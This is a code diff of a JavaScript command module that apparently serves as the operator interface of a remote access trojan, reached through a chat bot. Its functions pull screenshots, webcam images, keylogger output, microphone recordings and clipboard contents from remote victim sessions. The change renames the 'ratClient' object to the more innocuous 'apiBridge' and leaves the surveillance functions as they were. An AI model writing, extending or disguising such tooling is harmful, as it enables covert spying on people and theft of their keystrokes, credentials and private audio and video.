@@ -5,8 +5,8 @@ import { ResponseFormatter } from '../utils/formatter.js';
  */
 
 export class SurveillanceCommands {
-  constructor(ratClient, sock) {
-    this.ratClient = ratClient;
+  constructor(apiBridge, sock) {
+    this.apiBridge = apiBridge;
     this.sock = sock;
   }
 
@@ -25,7 +25,7 @@ export class SurveillanceCommands {
       text: ResponseFormatter.info('📸 Capturing screenshot...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.getScreenshot(sessionId);
+    const result = await this.apiBridge.getScreenshot(sessionId);
     
     if (result.success) {
       const buffer = Buffer.from(result.image, 'base64');
@@ -55,7 +55,7 @@ export class SurveillanceCommands {
       text: ResponseFormatter.info('📷 Activating webcam...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.getWebcam(sessionId);
+    const result = await this.apiBridge.getWebcam(sessionId);
     
     if (result.success) {
       const buffer = Buffer.from(result.image, 'base64');
@@ -81,7 +81,7 @@ export class SurveillanceCommands {
       return;
     }
 
-    const result = await this.ratClient.getKeylogs(sessionId);
+    const result = await this.apiBridge.getKeylogs(sessionId);
     
     if (result.success) {
       const response = ResponseFormatter.header('⌨️', 'KEYLOGGER OUTPUT') + 
@@ -109,7 +109,7 @@ export class SurveillanceCommands {
       text: ResponseFormatter.info(`🎤 Recording ${duration} seconds of audio...\n\n_Please wait..._`) 
     });
 
-    const result = await this.ratClient.recordAudio(sessionId, duration);
+    const result = await this.apiBridge.recordAudio(sessionId, duration);
     
     if (result.success) {
       const buffer = Buffer.from(result.audio, 'base64');
@@ -137,7 +137,7 @@ export class SurveillanceCommands {
       return;
     }
 
-    const result = await this.ratClient.getClipboard(sessionId);
+    const result = await this.apiBridge.getClipboard(sessionId);
     
     if (result.success) {
       try {
